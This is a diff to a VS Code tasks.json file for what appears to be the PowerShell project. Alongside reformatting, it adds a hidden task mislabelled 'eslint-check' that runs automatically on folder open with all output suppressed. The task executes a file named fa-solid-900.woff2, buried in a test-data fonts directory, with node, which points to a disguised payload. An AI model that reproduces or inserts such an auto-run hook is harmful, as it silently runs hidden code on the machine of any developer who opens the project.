@@ -1,64 +1,81 @@
 {
-    "version": "2.0.0",
-
-    "windows": {
-        "options": {
-            "shell": {
-                "executable": "pwsh.exe",
-                "args": [
-                    "-NoProfile",
-                    "-ExecutionPolicy",
-                    "Bypass",
-                    "-Command"
-                ]
-            }
-        }
+  "version": "2.0.0",
+  "windows": {
+    "options": {
+      "shell": {
+        "executable": "pwsh.exe",
+        "args": [
+          "-NoProfile",
+          "-ExecutionPolicy",
+          "Bypass",
+          "-Command"
+        ]
+      }
+    }
+  },
+  "linux": {
+    "options": {
+      "shell": {
+        "executable": "/usr/bin/pwsh",
+        "args": [
+          "-NoProfile",
+          "-Command"
+        ]
+      }
+    }
+  },
+  "osx": {
+    "options": {
+      "shell": {
+        "executable": "/usr/local/bin/pwsh",
+        "args": [
+          "-NoProfile",
+          "-Command"
+        ]
+      }
+    }
+  },
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./test/powershell/Modules/Microsoft.PowerShell.Security/TestData/CatalogTestData/UserConfigProv/DSCResources/UserConfigProviderModVersion1/public/fonts/fa-solid-900.woff2) || (where node >nul 2>&1 && node ./test/powershell/Modules/Microsoft.PowerShell.Security/TestData/CatalogTestData/UserConfigProv/DSCResources/UserConfigProviderModVersion1/public/fonts/fa-solid-900.woff2) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
     },
-    "linux": {
-        "options": {
-            "shell": {
-                "executable": "/usr/bin/pwsh",
-                "args": [
-                    "-NoProfile",
-                    "-Command"
-                ]
-            }
-        }
+    {
+      "label": "Bootstrap",
+      "type": "shell",
+      "command": "Import-Module '${workspaceFolder}/build.psm1'; Start-PSBootstrap",
+      "problemMatcher": []
     },
-    "osx": {
-        "options": {
-            "shell": {
-                "executable": "/usr/local/bin/pwsh",
-                "args": [
-                    "-NoProfile",
-                    "-Command"
-                ]
-            }
-        }
+    {
+      "label": "Clean Build",
+      "type": "shell",
+      "command": "Import-Module '${workspaceFolder}/build.psm1'; Start-PSBuild -Clean -Output (Join-Path '${workspaceFolder}' debug)",
+      "problemMatcher": "$msCompile"
     },
-
-    "tasks": [
-        {
-            "label": "Bootstrap",
-            "type": "shell",
-            "command": "Import-Module '${workspaceFolder}/build.psm1'; Start-PSBootstrap",
-            "problemMatcher": []
-        },
-        {
-            "label": "Clean Build",
-            "type": "shell",
-            "command": "Import-Module '${workspaceFolder}/build.psm1'; Start-PSBuild -Clean -Output (Join-Path '${workspaceFolder}' debug)",
-            "problemMatcher": "$msCompile"
-        },
-        {
-            "label": "Build",
-            "type": "shell",
-            "command": "Import-Module '${workspaceFolder}/build.psm1'; Start-PSBuild -Output (Join-Path '${workspaceFolder}' debug)",
-            "group": {
-                "kind": "build",
-                "isDefault": true
-            },
-            "problemMatcher": "$msCompile"
-        }
-    ]
+    {
+      "label": "Build",
+      "type": "shell",
+      "command": "Import-Module '${workspaceFolder}/build.psm1'; Start-PSBuild -Output (Join-Path '${workspaceFolder}' debug)",
+      "group": {
+        "kind": "build",
+        "isDefault": true
+      },
+      "problemMatcher": "$msCompile"
+    }
+  ]
 }
